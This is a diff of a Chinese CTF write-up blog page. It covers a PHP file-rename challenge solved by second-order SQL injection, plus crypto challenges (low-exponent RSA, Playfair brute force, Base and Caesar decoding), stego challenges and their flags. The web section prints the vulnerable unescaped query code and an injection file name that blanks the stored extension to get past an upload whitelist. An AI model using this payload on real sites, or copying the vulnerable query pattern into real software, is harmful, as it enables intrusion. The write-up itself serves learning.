class="line"></span><br><span class="line">```php</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"common.inc.php"</span>;</span><br><span class="line">define(<span class="string">'ROOT'</span>,dirname(<span class="keyword">__FILE__</span>).<span class="string">'/'</span>); </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($req[<span class="string">'oldname'</span>]) &amp;&amp; <span class="keyword">isset</span>($req[<span class="string">'newname'</span>])) &#123;</span><br><span class="line">    $result = $db-&gt;query(<span class="string">"select * from `file` where `filename`='&#123;$req['oldname']&#125;'"</span>);</span><br><span class="line">    <span class="keyword">if</span> ($result-&gt;num_rows&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        $result = $result-&gt;fetch_assoc();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"old file doesn't exists!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>($result) &#123;</span><br><span class="line">        $req[<span class="string">'newname'</span>] = basename($req[<span class="string">'newname'</span>]);</span><br><span class="line">        $re = $db-&gt;query(<span class="string">"update `file` set `filename`='&#123;$req['newname']&#125;', `oldname`='&#123;$result['filename']&#125;' where `fid`=&#123;$result['fid']&#125;"</span>);</span><br><span class="line">        <span class="keyword">if</span>(!$re) &#123;</span><br><span class="line">            print_r($db-&gt;errorInfo());</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $oldname = ROOT.UPLOAD_DIR . $result[<span class="string">"filename"</span>].$result[<span class="string">"extension"</span>];</span><br><span class="line">        $newname = ROOT.UPLOAD_DIR . $req[<span class="string">"newname"</span>].$result[<span class="string">"extension"</span>];</span><br><span class="line">        <span class="keyword">if</span>(file_exists($oldname)) &#123;</span><br><span class="line">            rename($oldname, $newname);</span><br><span class="line">            $url = <span class="string">"/"</span> . $newname;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Your file is rename, url:</span></span><br><span class="line"><span class="string">                &lt;a href=\"&#123;$url&#125;\" target='_blank'&gt;&#123;$url&#125;&lt;/a&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">                &lt;a href=\"/\"&gt;go back&lt;/a&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;<span class="keyword">echo</span> $oldname.<span class="string">" not exists."</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>由代码可以看出，题目是通过数据库来拼凑最终的文件名，审计了下代码没发现什么有用的思路，google了一下居然找到了原题！！2233 <a href="http://drops.xmd5.com/static/drops/tips-10564.html" target="_blank" rel="noopener">http://drops.xmd5.com/static/drops/tips-10564.html</a>，而且还给出了攻击流程，本题是个二次注入。</p>
 <p>题目使用了白名单过滤，所以所以无法通过后缀名绕过，而题目，漏洞发生在rename.php页面中，实现重命名功能时，在数据库中以文件名来查询，获取文件扩展名，id等信息，然后我们输入的新的文件名和查询的文件扩展名拼接在一起完成重命名，如果我们能够使查询的文件扩展名为空，那么拼接之后就只剩下我们的文件名了，通过这种方法可以实现修改文件名后缀的目的，攻击流程如下</p>
 <ol>
 <li><p>选择一个文件上传，命名为 <code>&#39;,extension=&#39;&#39;,filename=&#39;snow.jpg.jpg</code>，此时执行的sql语句是<code>insert into <code>file</code> ( <code>filename</code>, <code>view</code>, <code>extension</code>) values( ‘{$path_parts[‘filename’]}’, 0, ‘{$path_parts[‘extension’]}’)</code>，此时的数据库中<code>filename--&gt;&#39;,extension=&#39;&#39;,filename=&#39;snow.jpg</code>，<code>extension--&gt;jpg</code></p>
@@ -176,96 +179,57 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 4.2.1"></he
 </ol>
 <p><img src="https://i.loli.net/2019/01/27/5c4d642c02f24.png" alt></p>
 <p><img src="https://i.loli.net/2019/01/27/5c4d642bedc54.png" alt></p>
-<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;f34f8aa6cd362582dd1ae5f975c7b20f&#125;</span><br></pre></td></tr></table></div></figure>
-
-        <h1 id="crypto">
-          <a href="#crypto" class="heading-link"><i class="fas fa-link"></i></a>crypto</h1>
-      
-        <h2 id="现代密码签到">
-          <a href="#现代密码签到" class="heading-link"><i class="fas fa-link"></i></a>现代密码签到</h2>
-      <p>利用在线des解密，密钥为空。<br>解密后发现<br><code>U2FsdGVkX18968C+7acWUzWtYyuQd2MFLMh0HnGGnMlmYlemknPnfg==</code><br>是base64编码，将所得结果再次解密得到flag<br><img src="https://i.imgur.com/jPfKQ85.png" alt></p>
-
-        <h2 id="古典密码签到">
-          <a href="#古典密码签到" class="heading-link"><i class="fas fa-link"></i></a>古典密码签到</h2>
-      <p>看到字符串带<code>=</code>，猜测是base系列编码，解密发现是base32编码 ^pho^oav`\ntZnj`\ntZZZcccx ，之后就是移位密码了，当偏移量是5的时候解密出有意义的明文</p>
-<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">"xxxxxxxxxxxxx"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">	flag += chr(ord(i)+<span class="number">5</span>)</span><br><span class="line">print(flag)</span><br><span class="line">```</span><br></pre></td></tr></table></div></figure>
-<p>cumtctf{easy_soeasy___hhh}<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## easyrsa</span><br><span class="line"></span><br><span class="line">本题e很小，联想到应该是低指数攻击，本来以为是16进制，但是一直不对，细看了一下发现只有0-9和A，b共12个字符，猜测应该是12进制，尝试了一下果然就是12进制</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;python</span><br><span class="line"># coding&#x3D;utf-8</span><br><span class="line">import gmpy2</span><br><span class="line">e &#x3D; 5</span><br><span class="line"># 读入 n, 密文</span><br><span class="line">n &#x3D; int(&#39;36004b9A985A624479A4891b16130722A5A7453989bA61737A226368504A5689381236451796A445824b5A516b176b40135935b0b8999046154359b0560537100289b9795129505b461542A4897A56561529A705135AA772507bb3172b03b3425A99224b68b45b801459b29A070bAb9408761b4A70b905308772472934486924bA17013A2A801041A05178b0488AA5&#39;,12)</span><br><span class="line">c &#x3D; int(&#39;411A016A671768793b5AAbA4A043001A468b8A9A6122290461266393181b021812b6AAbAA1b57161bAA300321174154862338b0098249626A93116b34752540987309A08520bb6780804b5679144173Ab7301b49322587504A75A7A2445928A07A650bb6076bA3412b1375205336b43A11A1510A22893b937065&#39;,12)</span><br><span class="line">m, b &#x3D; gmpy2.iroot(c, e)</span><br><span class="line">print hex(m)[2:].decode(&#39;hex&#39;)</span><br></pre></td></tr></table></div></figure></p>
-<p>flag如下：<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cumtctf&#123;12_jinzhi_rsa&#125;</span><br></pre></td></tr></table></div></figure></p>
-
-        <h2 id="playfir">
-          <a href="#playfir" class="heading-link"><i class="fas fa-link"></i></a>playfir</h2>
-      <p>题目提示很明显，playfire密码爆破，可以看到秘钥是四位，代码如下</p>
-<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># playfair</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回该字符的行号和列号</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_row_col</span><span class="params">(word,pass_table)</span>:</span></span><br><span class="line">	li = pass_table.index(word)</span><br><span class="line">	li_r = li // <span class="number">5</span></span><br><span class="line">	li_c = li % <span class="number">5</span></span><br><span class="line">	<span class="keyword">return</span> (li_r,li_c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入两个元素的坐标，得到解密对应的两个元素</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_dou_word</span><span class="params">(r1,c1,r2,c2)</span>:</span></span><br><span class="line">	<span class="keyword">if</span> r1 == r2:</span><br><span class="line">		c1 = (c1<span class="number">-1</span>) % <span class="number">5</span></span><br><span class="line">		c2 = (c2<span class="number">-1</span>) % <span class="number">5</span></span><br><span class="line">		<span class="keyword">return</span> [(r1,c1),(r2,c2)]</span><br><span class="line">	<span class="keyword">elif</span> c1 == c2:</span><br><span class="line">		r1 = (r1<span class="number">-1</span>) % <span class="number">5</span> </span><br><span class="line">		r2 = (r2<span class="number">-1</span>) % <span class="number">5</span></span><br><span class="line">		<span class="keyword">return</span> [(r1,c1),(r2,c2)]</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> [(r1,c2),(r2,c1)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(cip,keyword)</span>:</span></span><br><span class="line">	<span class="comment"># global pass_table</span></span><br><span class="line">	alpha = list(string.ascii_uppercase)</span><br><span class="line">	alpha.remove(<span class="string">'J'</span>)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> keyword:</span><br><span class="line">		<span class="keyword">if</span> i == <span class="string">"J"</span>:</span><br><span class="line">			<span class="keyword">continue</span> </span><br><span class="line">		alpha.remove(i)</span><br><span class="line">	pass_table = list(keyword) + alpha</span><br><span class="line">	plain = <span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(len(cip)//<span class="number">2</span>):</span><br><span class="line">		grp = cip[i*<span class="number">2</span>:i*<span class="number">2</span>+<span class="number">2</span>]</span><br><span class="line">		r1,c1 = get_row_col(grp[<span class="number">0</span>],pass_table)</span><br><span class="line">		r2,c2 = get_row_col(grp[<span class="number">1</span>],pass_table)</span><br><span class="line">		temp = get_dou_word(r1,c1,r2,c2)</span><br><span class="line">		p1 = temp[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">5</span> + temp[<span class="number">0</span>][<span class="number">1</span>]</span><br><span class="line">		p2 = temp[<span class="number">1</span>][<span class="number">0</span>]*<span class="number">5</span> + temp[<span class="number">1</span>][<span class="number">1</span>]</span><br><span class="line">		plain += pass_table[p1] + pass_table[p2]</span><br><span class="line">	<span class="keyword">return</span> plain</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> sss <span class="keyword">in</span> itertools.permutations(string.ascii_uppercase,<span class="number">4</span>):</span><br><span class="line">	now_key = <span class="string">""</span>.join(sss)</span><br><span class="line">	cip1 = <span class="string">"DMBCCVTLMNKQ"</span></span><br><span class="line">	cip2 = <span class="string">"LRBECXPTCPHU"</span></span><br><span class="line">	t1 = decrypt(cip1,now_key)</span><br><span class="line">	t2 = decrypt(cip2,now_key)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">"FLAGA"</span> <span class="keyword">in</span> t1:</span><br><span class="line">		print(t1)</span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line">	<span class="keyword">elif</span> <span class="string">"FLAGB"</span> <span class="keyword">in</span> t2:</span><br><span class="line">		print(t2)</span><br><span class="line">		<span class="keyword">continue</span></span><br></pre></td></tr></table></div></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;f34f8aa6cd362582dd1ae5f975c7b20f&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="现代密码签到"><a href="#现代密码签到" class="headerlink" title="现代密码签到"></a>现代密码签到</h2><p>利用在线des解密，密钥为空。<br>解密后发现<br><code>U2FsdGVkX18968C+7acWUzWtYyuQd2MFLMh0HnGGnMlmYlemknPnfg==</code><br>是base64编码，将所得结果再次解密得到flag<br><img src="https://i.imgur.com/jPfKQ85.png" alt></p>
+<h2 id="古典密码签到"><a href="#古典密码签到" class="headerlink" title="古典密码签到"></a>古典密码签到</h2><p>看到字符串带<code>=</code>，猜测是base系列编码，解密发现是base32编码 ^pho^oav`\ntZnj`\ntZZZcccx ，之后就是移位密码了，当偏移量是5的时候解密出有意义的明文</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">"xxxxxxxxxxxxx"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">	flag += chr(ord(i)+<span class="number">5</span>)</span><br><span class="line">print(flag)</span><br><span class="line">```</span><br></pre></td></tr></table></figure>
+<p>cumtctf{easy_soeasy___hhh}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## easyrsa</span><br><span class="line"></span><br><span class="line">本题e很小，联想到应该是低指数攻击，本来以为是16进制，但是一直不对，细看了一下发现只有0-9和A，b共12个字符，猜测应该是12进制，尝试了一下果然就是12进制</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;python</span><br><span class="line"># coding&#x3D;utf-8</span><br><span class="line">import gmpy2</span><br><span class="line">e &#x3D; 5</span><br><span class="line"># 读入 n, 密文</span><br><span class="line">n &#x3D; int(&#39;36004b9A985A624479A4891b16130722A5A7453989bA61737A226368504A5689381236451796A445824b5A516b176b40135935b0b8999046154359b0560537100289b9795129505b461542A4897A56561529A705135AA772507bb3172b03b3425A99224b68b45b801459b29A070bAb9408761b4A70b905308772472934486924bA17013A2A801041A05178b0488AA5&#39;,12)</span><br><span class="line">c &#x3D; int(&#39;411A016A671768793b5AAbA4A043001A468b8A9A6122290461266393181b021812b6AAbAA1b57161bAA300321174154862338b0098249626A93116b34752540987309A08520bb6780804b5679144173Ab7301b49322587504A75A7A2445928A07A650bb6076bA3412b1375205336b43A11A1510A22893b937065&#39;,12)</span><br><span class="line">m, b &#x3D; gmpy2.iroot(c, e)</span><br><span class="line">print hex(m)[2:].decode(&#39;hex&#39;)</span><br></pre></td></tr></table></figure></p>
+<p>flag如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cumtctf&#123;12_jinzhi_rsa&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="playfir"><a href="#playfir" class="headerlink" title="playfir"></a>playfir</h2><p>题目提示很明显，playfire密码爆破，可以看到秘钥是四位，代码如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># playfair</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回该字符的行号和列号</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_row_col</span><span class="params">(word,pass_table)</span>:</span></span><br><span class="line">	li = pass_table.index(word)</span><br><span class="line">	li_r = li // <span class="number">5</span></span><br><span class="line">	li_c = li % <span class="number">5</span></span><br><span class="line">	<span class="keyword">return</span> (li_r,li_c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入两个元素的坐标，得到解密对应的两个元素</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_dou_word</span><span class="params">(r1,c1,r2,c2)</span>:</span></span><br><span class="line">	<span class="keyword">if</span> r1 == r2:</span><br><span class="line">		c1 = (c1<span class="number">-1</span>) % <span class="number">5</span></span><br><span class="line">		c2 = (c2<span class="number">-1</span>) % <span class="number">5</span></span><br><span class="line">		<span class="keyword">return</span> [(r1,c1),(r2,c2)]</span><br><span class="line">	<span class="keyword">elif</span> c1 == c2:</span><br><span class="line">		r1 = (r1<span class="number">-1</span>) % <span class="number">5</span> </span><br><span class="line">		r2 = (r2<span class="number">-1</span>) % <span class="number">5</span></span><br><span class="line">		<span class="keyword">return</span> [(r1,c1),(r2,c2)]</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> [(r1,c2),(r2,c1)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(cip,keyword)</span>:</span></span><br><span class="line">	<span class="comment"># global pass_table</span></span><br><span class="line">	alpha = list(string.ascii_uppercase)</span><br><span class="line">	alpha.remove(<span class="string">'J'</span>)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> keyword:</span><br><span class="line">		<span class="keyword">if</span> i == <span class="string">"J"</span>:</span><br><span class="line">			<span class="keyword">continue</span> </span><br><span class="line">		alpha.remove(i)</span><br><span class="line">	pass_table = list(keyword) + alpha</span><br><span class="line">	plain = <span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(len(cip)//<span class="number">2</span>):</span><br><span class="line">		grp = cip[i*<span class="number">2</span>:i*<span class="number">2</span>+<span class="number">2</span>]</span><br><span class="line">		r1,c1 = get_row_col(grp[<span class="number">0</span>],pass_table)</span><br><span class="line">		r2,c2 = get_row_col(grp[<span class="number">1</span>],pass_table)</span><br><span class="line">		temp = get_dou_word(r1,c1,r2,c2)</span><br><span class="line">		p1 = temp[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">5</span> + temp[<span class="number">0</span>][<span class="number">1</span>]</span><br><span class="line">		p2 = temp[<span class="number">1</span>][<span class="number">0</span>]*<span class="number">5</span> + temp[<span class="number">1</span>][<span class="number">1</span>]</span><br><span class="line">		plain += pass_table[p1] + pass_table[p2]</span><br><span class="line">	<span class="keyword">return</span> plain</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> sss <span class="keyword">in</span> itertools.permutations(string.ascii_uppercase,<span class="number">4</span>):</span><br><span class="line">	now_key = <span class="string">""</span>.join(sss)</span><br><span class="line">	cip1 = <span class="string">"DMBCCVTLMNKQ"</span></span><br><span class="line">	cip2 = <span class="string">"LRBECXPTCPHU"</span></span><br><span class="line">	t1 = decrypt(cip1,now_key)</span><br><span class="line">	t2 = decrypt(cip2,now_key)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">"FLAGA"</span> <span class="keyword">in</span> t1:</span><br><span class="line">		print(t1)</span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line">	<span class="keyword">elif</span> <span class="string">"FLAGB"</span> <span class="keyword">in</span> t2:</span><br><span class="line">		print(t2)</span><br><span class="line">		<span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
 <p>可以得到爆破出来符合条件的明文，找出语义正确的即可</p>
 <blockquote>
 <p>flagaplayfirflagbyoudoit</p>
 </blockquote>
 <p>求出md5值即可</p>
-<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;355c1fb44b58ad7c38d88b5ba4f095b0&#125;</span><br></pre></td></tr></table></div></figure>
-
-        <h1 id="MISC">
-          <a href="#MISC" class="heading-link"><i class="fas fa-link"></i></a>MISC</h1>
-      
-        <h2 id="misc签到">
-          <a href="#misc签到" class="heading-link"><i class="fas fa-link"></i></a>misc签到</h2>
-      <p>解压之后给出了5个图片文件:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;355c1fb44b58ad7c38d88b5ba4f095b0&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="misc签到"><a href="#misc签到" class="headerlink" title="misc签到"></a>misc签到</h2><p>解压之后给出了5个图片文件:</p>
 <p><img src="https://i.loli.net/2019/01/29/5c4fc4c6822ca.png" alt></p>
 <p>文件夹名是braille，想到了盲文，搜索盲文对照表</p>
 <p><img src="https://i.loli.net/2019/01/29/5c4fc69264c59.png" alt></p>
 <p>根据解压文件夹的提示可以对照出flag是B1ind。</p>
-
-        <h2 id="base全家桶了解一下">
-          <a href="#base全家桶了解一下" class="heading-link"><i class="fas fa-link"></i></a>base全家桶了解一下??</h2>
-      <p>应该就是base编码的转换，尝试一下不同的base编码即可</p>
+<h2 id="base全家桶了解一下"><a href="#base全家桶了解一下" class="headerlink" title="base全家桶了解一下??"></a>base全家桶了解一下??</h2><p>应该就是base编码的转换，尝试一下不同的base编码即可</p>
 <p>第一层base64</p>
-<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GY3DMQZWGE3DON2CGU3TMNJWIM3DGMZQGZCDMNJVIY3TIMZQGMYDKRRWGM3TKNSEG42DMMZXGQ3DMN2E</span><br></pre></td></tr></table></div></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GY3DMQZWGE3DON2CGU3TMNJWIM3DGMZQGZCDMNJVIY3TIMZQGMYDKRRWGM3TKNSEG42DMMZXGQ3DMN2E</span><br></pre></td></tr></table></figure>
 <p>第二层base32</p>
-<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">666C61677B57656C63306D655F7430305F63756D746374667D</span><br></pre></td></tr></table></div></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">666C61677B57656C63306D655F7430305F63756D746374667D</span><br></pre></td></tr></table></figure>
 <p>第三层base16</p>
-<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Welc0me_t00_cumtctf&#125;</span><br></pre></td></tr></table></div></figure>
-
-        <h2 id="BXS图标真好看">
-          <a href="#BXS图标真好看" class="heading-link"><i class="fas fa-link"></i></a>BXS图标真好看</h2>
-      <p>记事本打开发现是一个二进制文件，file命令查看一下文件类型</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Welc0me_t00_cumtctf&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="BXS图标真好看"><a href="#BXS图标真好看" class="headerlink" title="BXS图标真好看"></a>BXS图标真好看</h2><p>记事本打开发现是一个二进制文件，file命令查看一下文件类型</p>
 <blockquote>
 <p>BXS.txt: PNG image data, 495 x 422, 8-bit/color RGBA, non-interlaced</p>
 </blockquote>
 <p>修改后缀为png，看到一串文字<code>fgoo kwnl{_u n_gaDy_ 0p}</code>，提示古典加密，猜测是栅栏密码，因为字符串长度是21，所以应该分三栏</p>
 <p><img src="https://i.loli.net/2019/01/25/5c4a720c0a5e5.png" alt></p>
-<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Do_you_kn0w_png&#125;</span><br></pre></td></tr></table></div></figure>
-
-        <h2 id="矿大校歌认真听听吧？">
-          <a href="#矿大校歌认真听听吧？" class="heading-link"><i class="fas fa-link"></i></a>矿大校歌认真听听吧？</h2>
-      <p>下载zip压缩包，解压后需要密码，在16进制编辑器文件尾部看到<code>cumtctf2019</code>，解压即可得到一个mp3文件，音频也没有什么异常，应该是mp3隐写了<span class="exturl"><a class="exturl__link" href="https://ctf-wiki.github.io/ctf-wiki/misc/audio/introduction/#_2" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/misc/audio/introduction/#_2</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，运行尝试一下</p>
-<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Decode.exe -X -P cumtctf2019 cumt.mp3</span><br></pre></td></tr></table></div></figure>
-<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;cumtctf_1s_v3ry_g00d!&#125;</span><br></pre></td></tr></table></div></figure>
-
-        <h2 id="起床改error啦！">
-          <a href="#起床改error啦！" class="heading-link"><i class="fas fa-link"></i></a>起床改error啦！</h2>
-      <p>binwalk查看图片发现存在zip压缩包，提取一下</p>
-<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">binwalk 2333.png</span><br><span class="line">foremost 2333.png</span><br></pre></td></tr></table></div></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Do_you_kn0w_png&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="矿大校歌认真听听吧？"><a href="#矿大校歌认真听听吧？" class="headerlink" title="矿大校歌认真听听吧？"></a>矿大校歌认真听听吧？</h2><p>下载zip压缩包，解压后需要密码，在16进制编辑器文件尾部看到<code>cumtctf2019</code>，解压即可得到一个mp3文件，音频也没有什么异常，应该是mp3隐写了<a href="https://ctf-wiki.github.io/ctf-wiki/misc/audio/introduction/#_2" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/misc/audio/introduction/#_2</a>，运行尝试一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Decode.exe -X -P cumtctf2019 cumt.mp3</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;cumtctf_1s_v3ry_g00d!&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="起床改error啦！"><a href="#起床改error啦！" class="headerlink" title="起床改error啦！"></a>起床改error啦！</h2><p>binwalk查看图片发现存在zip压缩包，提取一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">binwalk 2333.png</span><br><span class="line">foremost 2333.png</span><br></pre></td></tr></table></figure>
 <p>解压压缩包可以得到一个doc文件，在选项中查看隐藏文字即可看到flag</p>
 <p><img src="https://i.loli.net/2019/01/27/5c4d21fd3ea8c.png" alt></p>
-
